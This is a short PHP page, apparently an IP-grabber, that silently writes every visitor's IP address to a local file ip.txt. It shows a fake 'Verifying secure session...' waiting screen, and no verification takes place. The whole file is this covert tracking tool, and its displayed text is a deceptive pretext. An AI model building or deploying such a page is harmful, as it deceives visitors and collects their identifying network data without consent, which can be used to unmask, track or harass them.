<?php
file_put_contents("ip.txt", $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Checking...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="background:#111;color:#eee;text-align:center;padding-top:100px;">
    <h2>Please wait...</h2>
    <p>Verifying secure session...</p>
</body>
</html>
